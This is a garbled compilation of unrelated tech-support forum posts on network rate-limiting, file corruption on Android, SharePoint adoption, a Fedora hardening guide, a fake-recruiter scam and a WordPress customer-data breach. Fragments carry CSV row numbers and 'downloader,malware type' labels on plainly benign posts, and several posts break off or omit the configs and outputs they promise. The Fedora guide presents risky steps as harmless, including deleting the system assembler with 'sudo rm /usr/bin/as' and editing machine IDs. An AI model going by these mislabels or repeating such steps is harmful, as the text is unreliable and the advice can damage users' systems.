To do this I've setup the following topology: [https://imgur.com/a/oO0oDbl](https://imgur.com/a/oO0oDbl)

I am trying to run simultaneous iperf3 tests from a public iperf server in my country down to the two different computers at the same time.

I am expecting to see the traffic rate-limited on my host sides, but I'm not seeing it. I'm not sure my policy-maps are applying correctly...

A little extra info on the topology: R1 is connected upstream to the internet. ""aaa"" and ""bbb"" networks are both publicly routable networks and belong to our block of IPs.  RA and RB are both home routers that our customers use and they perform NAT to the RFC 1918 WANs that Host A and Host B are a part of. I'm able to access the internet on both Host A and B.

Here is R1's relevant config:

I create two ACLs to match and permit traffic from networks A and B in and out.

I apply these ACLs to my 2 interfaces, et5 & et6 for in and out.

I then create class-maps that utilizes those ACLs for upload and download.

I next create policy-maps that reference those class-maps.

Next I apply the download rate-limiting policy map on the uplink interface of R1 (po1).

I finally apply the upload rate-limiting policy-map to the individual interfaces

&#x200B;

This \*should\* work...right? I've double-checked my ""inputs"" and ""outputs"" - trying to be mindful that they are from the perspective of the interface where they're applied.

How I'm running my iperf3 tests:

    speedtest.wtnet.de -p 5205 -P 1 -4

I'm using the above public iperf3 server, on port 5025, sending 1Gb of traffic using ipv4

When I run my iperf3 test on host A, this is what I get:

I don't understand why the Transfer size is so different between Host A and Host B. I've repeated this test multiple times and it's always the same. I also don't understand why the bandwidth is so different between the hosts. I would also expect to see the traffic limited to 55Mbps based on my policy-map, but I don't think I'm seeing that here.

447,"2023 Business Analyst Layers Access Issues. Hello everyone! I recently joined an organization and I am having trouble accessing layers that should be included within ESRI's Business Analyst but for some reason are unavailable to me. For context, we use both ArcMap and ArcGIS Pro but everyone mainly uses this data within ArcMap.

Everyone on the team uses ESRI's Business Analyst data from 2022 and has access to certain layers (like a nationwide streets layer and hydrology) for map production. However, when I joined the team a few weeks ago, I had to download the 2023 data package from MESRI because the 2022 was unavailable.

Anyway, when I look at the data, these same layers that everyone else seems to have access to are not within my dataset. We have gone over my access and licensing so that does not appear to be the issue.

This brings me to the following questions:

1. Is this data no longer available? I see that my 2023 data has Streetmap premium base map, but it doesn't let me use a streets layer or hydrology.

2. If no longer available, is there a way to access the 2022 data?

This media directory is not relevant. All relevant data i store inside docker volumes like my nextcloud storage, vaultwarden and portainer data itself. As i read it's safer to save data on volumes, to not have it directly in filesystem by themselves for something or someone (ME :D ) to mess up their permissions or accidentally delete it.

Now i am thinking about backup solution. Currently i have a laptop with exact same setup. Except that on laptop i just have one NVMe drive. I built this infrastructure on laptop and then moved it to my home server using rsync. I'm thinking of rsync to sync that /opt/nvme\_drive folder to my laptop and to external storage that i have connected to USB port. This way i will have 3 copies of data. But as i understand for docker data to copy properly by rsync docker containers and docker service itself need to be stopped at sync time.

I just bought a Sony Xperia V II and while I'm overall very satisfied with the device, there's one thing bugging me to no end and I have no idea what is going on since this is not limited to th SD.

Sometimes, or even rather 90% of the time, when I download zip files, they show up as empty when I try to unextract them via Files. I have a WinRar app installed that shows me those files as corrupted then. Most of the time when I restart the device, the files become extractable but only for a while. After a few minutes I cannot extract them anymore again.

Another problem I have is that some files randomly disappear for no reason. For now I mostly noticed this on the SD but I'm not sure if my Internal Storage doesn't do it, too. Basically I download and sometimes extract a file (whether downloaded to internal or SD storage doesn't matter) and when I move it to SD storage it's usable and visible for a while but disappears at some point. I don't know much time passes before it does.

I have no idea where to even start. My phone is running on Android 11, I have already removed the SD and reinserted it several times. I don't know any app that could check whether it isn't a fake. It's a Toshiba 512GB card and came with the device.

How do you encourage your clients/users to prefer/use SharePoint online instead of the local sync/file explorer?
We have migrated a lot of our clients over to SharePoint over the past few years but all have had the data synced to their PC's. However, some clients have a lot of data and this becomes an issue when the sync is involved as I find it gets pretty slow and also if moving large folders between sites it has to download then move the data which causes a whole host of issues.

How do you 'sell' the online version to users who are so set and used to using file explorer?

478,"Retrospectively adding disk encryption to VPS Ubuntu Server install. I recently purchased my first VPS and have had fun setting it up to be the household's personal VPN with DNS blocker. I am curious whether it's possible to retrospectively add disk encryption on a new partition, with a view that it ultimately replaces the current install.

You see, the VPS provider installed their own Ubuntu Server 22.04 image which, although making my life easy, removed the opportunity for me to add a LUKS partition during the usual Ubuntu install process.

Can anyone point me in the direction of a guide on how to do this, or advise whether the following might be possible and how to do it?

(a) create a separate partition on the remaining available space (approx. 6 GB)  
(b) download the Ubuntu Server image from their website and carry out the install process onto that partition, applying LUKS to that partition in the process  
(c) change the boot order so that the LUKS partition boots first (and not the current install)  
(d) remove the old partition and example the LUKS one to take up all the available space  
(e) enable unattended reboots, without having to manually enter the LUKS password",downloader,malware type

A couple of days ago I noticed a few people were not responding to my texts and didn't think anything of it until I met one in person and confirmed they did not receive any texts from me over several hours, and sent them a text standing next to them and still nothing came through. I was using the 'Textra' app but also tested the default Messages app and it was the same. I texted another person and they received all my messages over that same time period. Eventually, after many hard hours of googling, I tried a ton of solutions that night and honestly I'm not sure exactly what I did that fixed it but bingo, now my texts are being received!

Now here is my current issue that happened while trying to solve the previous issue. After I resynced Textra, I noticed a day later that I lost a few conversations completely in Textra. I checked in the default Messages app and what happened there is that all the conversations with those people are now all together as ""Anonymous"" and I can only read the texts, but have no option to reply or edit the contact(s) or anything. I also downloaded the handcent next app, but similarly to Textra, those conversations were not being shown, even though I know they exist since Messages still shows them.

These contacts all have TWO things in common that separate them from all other contacts. 1) They are all synced to my samsung account email. 2) They are all contacts that were added within the last 2 months. (I do have other older contacts saved under my samsung account email, but those conversations were not lost)

So, I'm assuming that the reason I can no longer see those past texts on Textra and that those text conversations were combined and made anonymous in the default Messages app are part of the same issue.

If anyone has literally any idea at all on how I can get those conversations back and separated like normal, I'd be extremely appreciative!",downloader,malware type

Lastly I wanted to say if you are studying for Cybersecurity certs I heard Jason Dion and Professor Messer are quite good and if you download Visual Studio Code - https://code.visualstudio.com/ as well as the extension that you need, learning code such as HTML, CSS, JavaScript, etc. can NEVER hurt and can only help (especially when looking over code and connecting the dots), my personal favorites for coding/scripting for software languages that I am learning is Python as well as PowerShell because of the ease of use and ability to create decent projects in a reasonable amount of time (learning Linux and MySQL helps as well but it may take longer to learn, it all depends on your preferences and trial and error, as well as being determined.)

The router comes with a SIM Card which I had inserted into the router for the 4g option which receives wifi similar to 4G where it gets it from cell towers (this might be the problem -\_-). We live in town which means I would think the fibre option would be better but the city I live in has around 100,000 people meaning it isnt the biggest. The router has the option to switch to being connected to a modem but the results were fairly the same (note: this might be because when I tested the fibre option I forgot to remove the SIM). It claims to be WIFI 6 which I compared with some other posts and was super far off. As you can see from the images the download and upload speed plus the ping is absolutely horrendous for what it claims it has. I have tried relocating the router multiple times and yet no changes. I will update after trying the option of plugging the LAN cables into the modem and removing the SIM.

**NB: Timezone are Observed in Eastern Standard Time. Kindly Choose what time works best.**   
 **Look forward to hearing from you!**

Then I checked out the emails used. Not the email of the person they claim to be.I won't name names here because I'm pretty sure I'm not allowed.And the crothallcar eers.com domain was used for the email, not a website used by Crothall healthcare.I picked an interview time and then I received another email:  
**Thank you for choosing Crothall Healthcare Inc. Carefully go through the file attached for more information about the job.**

**kindly accept my invitation or set up your R\*\*ingcentral.com and add me for your interview someonesnameicantmention**\*\*@aurabiosciences\*\* **careers.com** **https://a** **pp**\*\*.\*\* **ringcentral.co m/invite/**

\*\*link to ringcentral\*\*

**The interview process will consist of both questions and answers , more information about the position such as benefits, responsibilities, and position flexibility.**

The email also consisted of a document that outlined basically the following:$35 per hour to do some very ambiguous tasks, WFH and simply keep track of your hours worked on an excel sheet. uh-hmm. the email from Aurabiosc\*\*iencescareers.com also lands nowhere.

Then, still intrigued, I downloaded ringcentral for this interview and they asked me to fill out this jotform, during the interview time I picked, in lieu of an interview. //form.jotform \*\*.com/232002901785349 - reported the form to jotform in the meantime and they took it down.

1. Locking down application installs (UAC admin only)
2. No unnecessary downloads(Torrents, any media etc)
3. Forcing logoff during nonactive hours/ forcing Windows updates
4. Roaming profiles with predefined software installations
5. Remotely accessing laptops for troubleshooting any issues

541,"Pc disconnects from wifi when downloading large files. Hello everyone, ive had this problem for YEARS now and it's driving me crazy. I've tried everything, the power management options, setting my home network to private, nothing works.

I own a tower with windows 10 using a wifi adapter. As the title says , the computer disconnects from the wifi every ~20-30 minutes or so when downloading a large files like a game or whatever. When this happens, the only fix I found was to turn wifi off, turn it back on and then reconnect to network. If I dont do that, my computer won't even connect back even if I hit connect, it just says ""internet unavailable"", this only goes away when turning wifi off and on, and this is the case for both 2.4ghz and 5ghz bands, no difference at all.  This is extremely frustrating, because it means I have to monitor the download constantly or else it will just stop (so no leaving it downloading overnight). 

Something interesting to note is that the wifi will still work perfectly fine on my phone and other devices, so to me it doesn't seem likely that my entire network is crashing from being overloaded or something, it really seems to be something with my computer or wifi adapter.

I will eventually try replacing the wifi adapter, as im running out of solutions, but im asking here anyways just in case.

I've been using hotio's qbittorent, radarr and sonarr images for a while and I've been really happy with it.  
But A few weeks ago, I started having problems with radarr failing to copy my files to the destination folder.

I have qbittorrent on machine A and my video server on machine B (called ""orbiter"").  
I mounted destination folder on machine B to machine A like follow:

`sudo mount -t cifs //orbiter/Video/ /mnt/OrbiterVideo -o username=root,password=omgstrongpassword,uid=998,gid=100`

And added it to fstab:

Currently, I have a scheduled report that emails me the data once a month, and I have written some basic python to read/format the data and upload it to a local PostgreSQL database. So each month, I download the CSV file, save it and then run my python script that does the rest. Which works fine - but I'm keen to learn more about DE so i'm looking to automate this as much as possible.

So - my solar inverter has a ""Push Service"", which seems to be an API that can either send the data via a) FTTP or b) HTTP to a web address. So my next question is - what is the best way to do this? Do I just tell my solar inverter to FTTP the data to my NAS (or home server), and write a python script to run every day (or whatever) to read the JSON data and send it to Postres, or is there a better way to do this via HTTP using a local web server? This is where I'm a bit lost. I'd like the data in 5 minute intervals (so 288 JSON files p/day).

I have a home server running proxmox, with multiple VMs/LXCs running 24/7 - including a PostgreSQL server, Linux VM with docker, and various other services. Suffice to say i'm not afraid of getting my hands dirty. I honestly want to make this as automated as possible, with somewhat close to ""real-world"" implementation to learn some DE techniques. Also, because this is a personal project - free or close to free is ideal.

So my question - how should i go about this? What would be considered ""best practice""?",downloader,malware type

We just started receiving reports a few days ago that when a user tries to open a file on our file server (on-prem) it would take a long time to load. So we tested this and confirmed that (for testing) a 6 MB file takes a couple of minutes to open. Biggers files take longer.

We've checked the potential server having the issue and compared it with other servers, and we have the same issue on all servers, not just one. We use VMWare and the disks, CPU, and memory all look good. We tried flipping to our standby Cisco ASA firewall, but that did not change anything. VMs can transfer between each other just fine. 

The other day, we had one of our switch stacks re-built but that should have only impacted one location, which does not house the servers.

So it is looking like a switch issue, but I was not part of the switch maintenance that was done and if it was only done to our one location that does not have the servers in it, why would that impact our servers?

I am learning modern software development with kubernetes and CI/CD, but learning it from platform engineering side. And I am stuck and cannot make a sensible decision on building various versions of docker image. Here is my goal:

git CI/CD to build app, package as Docker image and upload to AWS ECR, then ArgoCD will deploy it into kubernetes. I am also planning to use trunk based development with short lived branches. (reason for short lived branches is because it is easy to setup in my head, and I do not trust myself and ""potential colleagues"" with quality code just yet).

Workflow is:

PR: tests, build app and package as docker, but do not upload anywhere. Just for the sake of testing the build.

Merge to main branch.

Because in TBD, it is assumed that main branch (trunk) should always be ready for deployment. Hence, I think it is good to deploy from trunk to QA/test environments. So once the new code is in main brahcn:

\- tag commit with semver

\- ci/cd will be triggered to build and upload docker image to ECR

\- ArgoCD to deploy said version to test/QA env.

\- when QA is happy, ArgoCD to deploy said version to production

however, what if I want my infrastructure to use "":prod"" or "":qa"" image tags always, instead of semver or commit sha? This is my current workflow and I think it is wrong, it is a waste of internet bandwidth:

\- tag main branch as ""qa"", then CI will build image with "":qa"" tag, upload to ECR

\- deploy to QA. do all the tests, when we are happy:

\- tag same git commit with ""prod"" git tag to produce "":prod"" docker image

\- pipeline will download "":qa"" image from AWS ECR repo, re-tag it as "":prod"" and upload back. This results in just adding "":prod"" tag to "":qa"" image, no new images are uploaded which is expected.

Reason I do this instead of re-building from same commit id, is because I cannot rely on external dependencies not being changed, or CI server keeping cache of :qa image, thus the new ""prod"" image may differ from QA.

i have used it for years with no modifications so if you dont want to harden your fedora you dont have too, this guide is for those who do want to hardened fedora, and improve lynis audit score

i have spent alot of time testing this guide on my assortment of machines and possible uses

this is the most universal guide i could make and the options that are not universal come with the option to keep or remove that setting, and any setting can be undone at anytime, so no worries

this guide assumes you will be able to use the terminal to enter these commands copy and paste

it also assumes you will have a pc ready for upgrade and install

and it also assumed you will have a usb/dvd to install fedora from and possibly bios update file

HUGE shout out and thanks to /chrisawi and the other awesome members of the linux community who helped me greatly on my wrong turns and explained things in a way i could easily understand, greatly appreciated

this guide could still use alot of tweaking so anyone that wants to help fix problems or add improvements pls do join the conversation :)

its alot of info dont feel rushed to get it all done in one day, remember what step your on so you can undo it if you mess up, or use your back up timeshift ect to restore to previous state, if you follow this guide there will be no need for that, no worries

lets begin in this order from here, extras at the bottom and some sources i condensed to make this guide

&#x200B;

step 1

downloaded bios update from motherboard manufacture and put on usb or where it tells you to put it

update bios in the bios setting: make sure you have the right bios file and you know how todo it or skip this step, its very important step but also can be risky if you dont know what your doing

set strong bios passphrase and settings: list of bios changes i made at bottom of this post

downloaded fedora 38 iso

flash iso to usb

install fedora to PC offline (no lan or wifi connected)

set strong encryption passphrase during install, this can be the same strong passphrase used for bios

enabled 3rd party repos during install

once installed enable firewall:

systemctl enable firewalld

systemctl start firewalld

sudo firewall-cmd --set-default=drop     skip this step if you want incoming connections for sshd ect

or setup portmaster as application firewall instead of firewalld

install updates from app store and restart

update and restart again for secure boot file from app store

check device security page make sure first 2 levels are achieved and secure boot is on, these security levels are achived thru bios settings and your hardware capability, some older machines wont qualify here buts that ok, a lil less secure but if its what you got then move on with the next steps

uninstall all unwanted apps from software store, anything your not using that can be uninstalled

set secure settings on firefox such as, https, strict mode, disable telemetry, set search engine and dns

install ublock select all lists and updated its lists from inside the ublock settings

goto rpmfussion site and goto configure section and copy the fedora workstation related command and appstream metadata command both in rpm format, paste those commands into the terminal

install flathub from flathub site the same way you just did the rpmfussion site

then install chosen apps from app store:

install extension manager

install keepassXC

install media codecs from store

that might have fixxed your firefox codecs already but just in case we enter these commands

sudu dnf install ffmpeg --allowerasing

sudo dnf install mozilla-openh264

in the Firefox url bar type about:config  then search the sentence below and toggle to true

media.ffmpeg.vaapi.enabled

&#x200B;

this next command turns off suspend to ram \[deep\] and sets it to s2idle which gets our device security score to HSI 3 but it still does not say suspend to idle so its still a work in progress to full reach 3 and 4

sudo grubby --args=""mem\_sleep\_default=s2idle"" --update-kernel=ALL

&#x200B;

optional extensions: vitals, dash to panel, ip finder

setup apps: bleachbit, keepassXC, freetube, mullvad

sudo dnf install gnome-tweaks

sudo dnf install lynis

sudo dnf install timeshift

sudo dnf install rkhunter      

then:

sudo rkhunter --propupd    

sudo rkhunter --update

sudo  rkhunter --check --sk

&#x200B;

optionally:   

in nautilus settings enable show hidden files and delete permanently options

in gnome tweaks enable minimize and maximize and center folder options

&#x200B;

before making any changes from here its best practice to do a timeshift backup, make sure all your important files are safe, have a live usb such as fedora install ready to undo changes if you break something, you just boot into the live usb, open encrypted drive and fix the file you last edited

this guide has been tested only on my machines, everyone also has different uses for a PC, for example i will point out the values in this list that some people might want to remove from the list, like wifi or bluetooth, i remove them because i dont use them and for security

&#x200B;

open terminal and copy and paste these commands, dont copy the description tho if there is one

sudo -i

systemctl disable --now pcscd.socket pcscd.service                      used for smart cards

systemctl disable cups                                                                         used for printers

systemctl disable wpa\_supplicant.service                                        used for wifi

systemctl disable ModemManager.service                                      used for 3g/4g data

systemctl disable bluetooth.service                                                   used for bluetooth

systemctl disable avahi-daemon.service

systemctl disable nis-domainname.service

systemctl disable sssd.service

systemctl disable sssd-kcm.service

systemctl disable rpcbind.service

systemctl disable gssproxy.service

systemctl disable [nfs-client.target](https://nfs-client.target)

then

systemctl mask cups

systemctl mask avahi-daemon.service

systemctl mask bluetooth.service

systemctl mask nis-domainname.service

systemctl mask sssd.service

systemctl mask sssd-kcm.service

systemctl mask rpcbind.service

systemctl mask gssproxy.service

systemctl mask wpa\_supplicant.service

systemctl mask ModemManager.service

systemctl mask [nfs-client.target](https://nfs-client.target)

systemctl mask rpc-gssd.service

systemctl mask rpc-statd.service

systemctl mask rpc-statd-notify.service

systemctl mask nfsdcld.service

systemctl mask nfs-mountd.service

systemctl mask nfs-idmapd.service

and then:

systemctl daemon-reload

&#x200B;

if your not using ssh then i would also mask that:

systemctl mask sshd.service

these can be unmasked with the unmask command just as easy

&#x200B;

To disable tty terminal make the below changes in:

&#x200B;

sudo nano /etc/systemd/logind.conf

&#x200B;

uncomment these and change the values

&#x200B;

NAutoVTs=0

ReserveVT=N

&#x200B;

next:

sudo nano /etc/modprobe.d/custom-blacklist.conf

copy and paste this list into that file and save it, i use nano so ctrl+o to write the file and then ctrl+x, i dont think you ever need any of these but if you do just delete the line from the file

you can save and close this file now but there is MORE that should be done, but wont raise your lynis score much:

&#x200B;

Source routing is an Internet Protocol mechanism that allows an IP packet to carry information, a list of addresses, that tells a router the path the packet must take. There is also an option to record the hops as the route is traversed. The list of hops taken, the ""route record"", provides the destination with a return path to the source. This allows the source (the sending host) to specify the route, loosely or strictly, ignoring the routing tables of some or all of the routers. It can allow a user to redirect network traffic for malicious purposes. Therefore, source-based routing should be disabled

&#x200B;

Disabling Source Routing by adding this line with the rest of them in the 99-sysctl.conf file

&#x200B;

net.ipv4.conf.all.accept\_source\_route=0

&#x200B;

Disabling the forwarding of packets should also be done in conjunction with the above when possible (disabling forwarding may interfere with virtualization)

&#x200B;

net.ipv4.ip\_forward=0

&#x200B;

net.ipv4.conf.all.forwarding=0

net.ipv6.conf.all.forwarding=0

net.ipv4.conf.all.mc\_forwarding=0

net.ipv6.conf.all.mc\_forwarding=0

&#x200B;

i was able to apply all of these above and below and boxes still works and can still get online just fine

&#x200B;

Accepting ICMP redirects has few legitimate uses. Disable the acceptance and sending of ICMP redirected packets unless specifically required. These commands disable acceptance of all ICMP redirected packets on all interfaces

you probaly dont need ICMP but if you do you can use iptables rules to secure it

&#x200B;

net.ipv4.conf.all.accept\_redirects=0

net.ipv6.conf.all.accept\_redirects=0

net.ipv4.conf.all.secure\_redirects=0

net.ipv4.conf.all.send\_redirects=0

&#x200B;

sudo sysctl -p

that command makes them permanent and lists the applied kernel values

&#x200B;

sudo grubby --update-kernel=ALL --args=""module.sig\_enforce=1""

&#x200B;

sudo grubby --update-kernel=ALL --args=""ipv6.disable=1""

use above command ONLY if you want to DISABLE ipv6, if you want to use ipv6 then privacy issues will be addressed in the sysctl file and thru network manager:

&#x200B;

sudo nano /etc/NetworkManager/NetworkManager.conf and add:

&#x200B;

\[connection\]

ipv6.ip6-privacy=2

&#x200B;

sudo nano /etc/security/limits.conf

add the following line to the section near the bottom above the line that looks similar

\* hard core 0

&#x200B;

sudo grub2-mkconfig -o /boot/efi/EFI/fedora/grub.cfg

&#x200B;

A unique Machine ID is stored in sudo nano /var/lib/dbus/machine-id and on systemd systems, /etc/machine-id also. These should be edited to something generic, such as the Whonix ID:

&#x200B;

b08dfa6083e7567a1921a715000001fb

&#x200B;

for some people this step might be unnecessary but it will raise your score and only takes a moment

set proper host name  sudo nano /etc/hosts

use command ip a

to find your local ip mine looks like this inet [192.168.1.123/24](https://192.168.1.123/24)

this is the part we need [192.168.1.123](https://192.168.1.123) we add that ip to our chosen host name of our pc for example:

when i open the terminal i see this before every prompt ""\[fractal@fedora \~\]$"" fractal is my user name and fedora is my host name, so fedora is the word i will combine with my local ip here is an example:

add two lines that looks like this at the bottom of /etc/hosts except with your info not mine

[192.168.1.123](https://192.168.1.123) fedora fedora.local

[127.0.1.1](https://127.0.1.1) fedora fedora.local

&#x200B;

remove the compiler:

sudo rm /usr/bin/as

that should fix lynis warning about compiler but there could be more

&#x200B;

To make new files unreadable by anyone other than the owner edit:

sudo nano /etc/profile and add:

&#x200B;

ulimit -S -c 0 > /dev/null 2>&1

umask 077

&#x200B;

sudo nano /etc/login.defs

umask 077

&#x200B;

setup usbguard: sudo dnf install usbguard

then plug in all your trusted usb devices and use this command:

&#x200B;

sudo usbguard generate-policy | sudo tee /etc/usbguard/rules.conf

secure sshd config file:

if you use sshd then basics are: turn off root login, set your pub key to be accepted and then turn off password auth

&#x200B;

now a lynis score of 85 and 24 suggestions

you should also have a device HSI score of 3 or essentially 4 if you have enabled TSME or SME in bios

&#x200B;

sudo nano /etc/login.defs

and set the YESCRYPT\_COST\_FACTOR 10

that doubles your password encryption strength, you might have to set a new password for it to work

also in that file you can also configure password age settings if you want too

AND WERE DONE :) congrats

596,"Tech Support Advice Request: Downloads Intermittently (frequent) over 443 specifically (believe so). Hello,

My connection seems pretty solid, with fast internet speeds over fiber, residential, out in the boonies, and would have never guessed I had a connection issue.

However, recently I've had interest in running and local-hosting my own AI art server/model.

When downloading assets for this I've noticed that I have an intermittent connection, this tends to be when downloading models and python instructions, typically over 443, mostly from [huggingface](https://huggingface.co/), though has happened on other distributions such as anaconda/python repos, and a secondary outlet for AI art files such as [civitai](https://civitai.com/). This happens both on browsers (any), and anaconda/CLI consoles. 

I've tried various fixes, such as setting TTL, settings, resetting winsock, and internet settings, as well as reinstalling the adapters (though one thing was blocked, re-installing the entire TCP/IP tunnel protocol, per some windows 10/11 bug/limitation.)

any advice on what could be causing this or where to look would be appreciated.

further info:

interrupting the download by disabling adapter and re-enabling it lets me resume, for browser downloads this is a barley passable work-around, as it is fast to download, just quick to interrupt sometimes, but when in the CLI side of things, this cannot be resumed and can sometimes interrupt highly sensitive processes. Without manual interruption, the download can hang for minutes, to hours, before finally closing/retrying the connection. sometimes with success of re-establishing the download or other process, others with flat failure. 

again, this only seems to happen over 443 port downloads (SSL?) as streaming, gaming, and other less sensitive downloads, the majority of the connection overall, are problem free. ",downloader,malware type

I've been using a pretty decent Monster aux cord with a splitter for the last 3 years . No problems with it ever, really. I listen to most of my music on Spotify. Ever since I downloaded a few songs 4 days ago, it seems like this issue immediately started. Once I plug the auxillary in and open Spotify it starts doing several different things, sometimes slower, like every 2-3 seconds but usually in quick succession to the point where I can't even listen because it's so bad. Google Assistant (I think) pops up the most like it thinks I'm speaking into the microphone to give the phone a command, but it'll also pause and stop as well as make the volume go up and down. It's absolutely terrible and if you knew how much I love (and need) my music I think you'd understand lol.

605,"Where are my security fails?. I'm a relative selfhosting and networking newbie, at least compared to most people in this community.

For most of the time I've owned my Qnap NASes (I have a few), I've stuck with the advice of only making them available to the local network, and then using a router-based VPN to get into that network from afar as needed. 

I've had a few situations come up where it would be handy to have some servers accessible over the 'net *without* being behind the VPN. I've been learning more about containers, reverse proxy and some other concepts that I only had a passing familiarity with until very recently. Below, I'm going to describe my setup, and I'm asking for any help spotting problematic security issues. Here goes!

* My Asus router supports a free DDNS at subdomain of [asuscomm.com](https://asuscomm.com) \-- let's call it [mynet.asuscomm.com](https://mynet.asuscomm.com). On my domain registrar, I have various alias records for domains and CNAME records for subdomains pointing to that.
* My router has ports 80 and 443 forwarding to a container with bridge networking (so its own IP) running NGINX Proxy Manager. That container's only access to the rest of the NAS filesystem is for a single configuration folder. NGINX is directing incoming requests to various IPs and ports on my home network (see below) based on the domains/subdomains being used to reach my network. It's also handling SSL for these services, obtaining and renewing certificates via Let's Encrypt.
* I have a Calibre Web server also running in a docker container. That container only has access to a config directory and to the directory where the library and books are stored. It's also running in bridged networking mode, so that it has its own IP. HTTP requests to [books.oneofmydomains.com](https://books.mydomain.com) get routed to the Calibre Web server's IP address on an arbitrary port configured in the server. Calibre Web server has the ability to handle HTTPS if you point it to SSL certificates/keys, but instead I'm having that handled via the NGINX reverse proxy setup. (Calibre Web's developer isn't interested in having the service using two ports to handle http/https handoffs, so you've always got to be explicitly using https in the address, but this works nicely with NGIX).
* I have an SFTPGO server running in yet another container, with FTP over TLS enabled. This container only has access to a config folder and a single folder for FTP uploads/downloads. The single user configured for it also only has access to that one folder, within the containerized system SFTPGO sees. I'm aware that even with TLS, FTP is outmoded, and SFTP is strongly preferred. Unfortunately, I need to use it for delivering photos back to my server in real-time with my camera, which supports FTPS but not SFTP. Nginx Proxy Manager can't directly support FTP proxying, but I do have an entry in it for [thedomainIuseforftp.com](https://thedomainIuseforftp.com), so that it registers and downloads SSL certificates from Let's Encrypt ( know there are other ways of obtaining and renewing the certificate, but this seems handy). I then use symlinks on the NAS to make those certificates available to SFTPGO, since its container can't see the Nginx config folders directly. Two arbitrary ports on my router forward to the SFTPGO server for FTP/S access.

I may additionally set up some more services (possibly my Plex) this way going forward, depending on need/convenience. 

It's handy for me to make the Calibre server available without the VPN for sharing it with some family members outside my household.

I need the FTPS access without the VPN because the camera's abilities are limited, and it has no way to connect to a VPN. I'd need a portable wifi hotspot/router that could put its entire LAN behind my home router's VPN, or a rooted phone that could do the same with its wifi tethering, but neither is particularly practical for my purposes. I mostly use the camera this way in on-the-go situations without a lot of time for fiddling with setup.

I'm aware there may be some benefit to setting up a cloudfare tunnel to protect these services further, but will admit I don't know much about that (yet). From what I gather, among other things this would help protect me from DDOS attacks?

&#x200B;

We're having an odd issue that is reproduceable, but we cannot explain what the cause of the issue is.  
  
We have our users set up with various redirected folders that point to a CIFS share on a SVM ( \\\\SVMServer.mydomain.com\\UserFiles\\profiles\\%USERNAME% ). Folders redirected are Desktop, Documents, Pictures, Downloads, etc. As far as Windows is concerned, all of the folders redirect properly, and can be accessed through File Explorer.  
  
The problem is that Google Chrome as well as MS Edge will not allow saving to the redirected downloads folder if it's stored on the NetApp. If I redirect this folder to a different Windows server, it will allow the redirected downloads folder to work properly. The Downloads folder on the NetApp have been confirmed to have the individual users as owner, with Full permissions. (Downloads has been configured to redirect through GPOs on the Windows/Redirected folders side, as well as the Chrome ADMX settings. Edge behaves the exact same, so I haven't bothered t-shooting it yet.  
  
Anyone ever seen issues with Chrome or Edge not allowing a pre-configured/redirected download location to work with a CIFS share on an SVM?

I have had my computer for about 3 years now. I have played all sorts of triple-A games throughout the years which has worked fine until a couple of months ago. I pretty sure i noticed it while playing PUBG and it has just gotten worse since then. The main problem is that almost all of my games becomes very laggy after just a couple of minutes. 

First i tried changing my graphics settings inside my games, but it didn't matter. I would get the same waves of high frames for 3-10 seconds and then down to 20-30 fps or lower. Even if the graphic settings were as low as they could get, I would still experience the same wave of frames.

I have geforce installed so i know i have the newest drivers. Still, there's one thing that confuses me. When I let geoforce optimize my game settings, it always puts them at maximum or high. I know that i have good/great parts that should be able to make my pc run the newest titles atleast at a reasonable fps. So i understand why i have so much lag. I have also tried resetting which included wiping my computer twice, once for windows 11 and once for windows 10. I do get good internet so that can't be that either. 

One thing that might have had an affect is that one time i accidentally bended my charging cable at the back of my computer so it became kinda loose. So when i would plug it in i would see sparks, but thats it. I have also changed that cable, but still no effect or change

I have never changed any parts or downloaded sketchy programs/files on my pc so i don't know why it is acting like this. 

I appreciate all the help i can get as i feel as if i have tried everything, thanks

This is my first time posting in the WP subreddit, but I've been using WP for many years. I've, fortunately, had no security issues with my websites, but this morning I was made aware of an incident involving my customers.

I have a website that sells licensed products (themes, plugins, etc). One of my customers informed me that they received an odd email asking them to download an important security patch. This email came from a similar domain ([mydomain.com](https://mydomain.com) vs [mydomain.me](https://mydomain.me)). After scanning and decoding (Ioncube) the contents of the email, I discovered it was an attempt to steal the customer's client database.

Throughout the day, I've had more and more of my clients email me asking about the legitimacy of this email. I've since sent out communication informing them not to download the malicious files, but I'm s sure a few have already done so.

I believe that my customer database (housed in Easy Digital Downloads) was compromised somehow. I've done some initial snooping but cannot find unauthorized access to my WP admin. I have 2FA enabled on all admin accounts and all of my plugins are up-to-date (I check my website daily and run updates when possible). It would only be possible for this type of email scam to be sent out with all of my customer's email addresses. But if my entire database was breached, I imagined my website would be completely messed up, and it's not.

I am currently hosted on WPEngine and utilize my Cloudflare Pro account with CF APO. I have a handful of WAF rules in place, but I don't know what to do next. Have you all gone through similar experiences? How did you handle your data breach, and what security recommendations might you have for someone in my position?

I'm currently looking into Wordfence Care, but I don't know if that's worth it or helpful. I'm also considering changing the WordPress password salt so all users are forcefully logged out. I've asked my customers to change their passwords as there is no way to mass reset them. I don't know my first step to harden my WP instance, as I do not know where the breach happened.

I have an XLR microphone that I use on my Mac through an Audio Interface which has hardware knobs for volume controls.

So what's the solution, and how do I get around this? Well, the developer of 'MuteKey' advised I must ""route all XLR mic input audio to a virtual audio input device"" ..... So I found a program called Blackhole, but unfortunately this program is not capable of doing this specific task despite appearing to.

We're about to kick-off a project using ForensiT ([https://www.forensit.com/products.html](https://www.forensit.com/products.html)) to migrate profiles.  This is part of an Azure AD (soon to be called Entra) project.

Does anyone have any experience with how the migration works with Dropbox or Google Drive?  Since it's just really updating the existing profile, all the downloaded files for those apps would still be there.  I understand that passwords do not migrate due to new user credentials in the new profile (makes sense) and will have to be re-entered.  So, once that is done is Dropbox (for example) smart enough to realize allt he files are there instead of resyncing?

647,"Self Hosting Container has Changed my Life. So I'm a fairly tech savvy guy, and have a background in Data Engineering and a Masters in it. I know relational databases, nosql, python etc pretty well. But even thought I've taken one or two prerequisite classes in web development, networking, security, etc and I've worked within the IT field where other departments handle all that, I think I just had a vague understanding of what they did.

So with that context, around March, I decided to host an app on a container on my Synology NAS, without really understanding the technology. I figuring it out with google fu, and brute forcing through instructions, without really understanding what I was doing.

I decided for fun, I'd take an online class on containers. I realized that there's a lot of things I needed to understand like networking. So I would take a class on networking to understanding what is actually happening when I exposed a port so my other devices could access it. Then I realized that class was too complex at my level of understanding, and I needed to go down a level to understand like the OSI model. This is stuff I had to learn at some point, but I figured it wasn't really my domain and I didn't let any of it sink in.  


Then I thought about being able to access my app outside my network, and thought that I shouldn't just play around with with just exposing my network to the internet, so I started learning about security, and reverse proxies, and VPNs.   


